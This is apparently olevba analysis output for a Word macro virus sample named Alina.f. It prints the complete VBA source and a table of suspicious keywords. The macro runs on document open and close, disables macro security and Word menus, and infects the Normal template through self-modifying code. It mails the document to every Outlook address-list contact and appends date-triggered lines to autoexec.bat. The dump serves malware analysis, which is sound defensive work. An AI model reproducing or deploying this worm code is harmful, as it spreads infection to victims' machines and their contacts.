olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Alina.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Alina.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Call Default
End Sub
Private Sub Document_Open()
Call Default
End Sub
Private Sub Default()
On Error Resume Next
CustomizationContext = NormalTemplate
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Lavel") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Lavel") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Default") <> "Liton/Alina/Liton" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Default") = "Liton/Alina/Liton"
End If
Set ADC1 = ActiveDocument.VBProject.VBComponents(1)
Set NDC1 = NormalTemplate.VBProject.VBComponents(1)
ExportFile1 = Application.StartupPath + "\~Default.tmp"
ExportFile2 = Application.StartupPath + "\~Default.ini"
If UCase(Dir(ExportFile1)) = "~DEFAULT.TMP" Then Kill ExportFile1
If UCase(Dir(ExportFile2)) = "~DEFAULT.INI" Then Kill ExportFile2
If ADC1.CodeModule.CountOfLines > 0 Then ADC1.Export (ExportFile1)
If NDC1.CodeModule.CountOfLines > 0 Then NDC1.Export (ExportFile2)
If ADC1.CodeModule.CountOfLines > 0 Then
For i = 1 To ADC1.CodeModule.CountOfLines
ADC1.CodeModule.DeleteLines 1
Next
End If
ADC1.CodeModule.AddFromFile (ExportFile2)
If ADC1.CodeModule.CountOfLines > 0 Then
For i = 1 To 4
ADC1.CodeModule.DeleteLines 1
Next
Else
ADC1.CodeModule.AddFromFile (ExportFile1)
For i = 1 To 4
ADC1.CodeModule.DeleteLines 1
Next
End If
If NDC1.CodeModule.CountOfLines > 0 Then
For i = 1 To NDC1.CodeModule.CountOfLines
NDC1.CodeModule.DeleteLines 1
Next
End If
NDC1.CodeModule.AddFromFile (ExportFile1)
If NDC1.CodeModule.CountOfLines > 0 Then
For i = 1 To 4
NDC1.CodeModule.DeleteLines 1
Next
Else
NDC1.CodeModule.AddFromFile (ExportFile2)
For i = 1 To 4
NDC1.CodeModule.DeleteLines 1
Next
End If
Dim UDO, DMN, BUOS
Set UDO = CreateObject("Outlook.Application")
Set DMN = UDO.GetNameSpace("MAPI")
DMN.Logon "profile", "password"
For l = DMN.AddressLists.Count To 1 Step -1
Set ADB = DMN.AddressLists(l)
i = 0
Set BUOS = UDO.CreateItem(0)
For t = ADB.AdressEntries.Count To 1 Step -1
o = ADB.AddressEntries(i)
BUOS.Recipients.Add o
i = i + 1
If i = ADB.AddressEntries.Count Then
t = 1
End If
Next t
BUOS.Subject = "If you restore your default health & wealth, please see attached document below:=" + Application.UserName
BUOS.Body = "Default health & wealth manual:="
BUOS.Attachments.Add ActiveDocument.FullName
BUOS.Send
o = ""
Next l
DMN.Logoff
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Day(Now) = 15 And Month(Now) = 8 Then
Open "c:\autoexec.bat" For Append As #1
Print #1, "Pause ""National mourning & freedom day..."""
Close #1
End If
If Day(Now) = 16 And Month(Now) = 12 Then
Open "c:\autoexec.bat" For Append As #1
Print #1, "Pause ""Indepandent day..."""
Close #1
End If
If Day(Now) = 28 And Month(Now) = 8 Then
Open "c:\autoexec.bat" For Append As #1
Print #1, "Pause ""Happy birthday..."""
Close #1
End If
If Day(Now) = 21 And Month(Now) = 2 Then
Open "c:\autoexec.bat" For Append As #1
Print #1, "Pause ""Saheed day..."""
Close #1
End If
If Day(Now) = 30 And Month(Now) = 4 Then
Open "c:\autoexec.bat" For Append As #1
Print #1, "Pause ""Marriage day..."""
Close #1
End If
End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

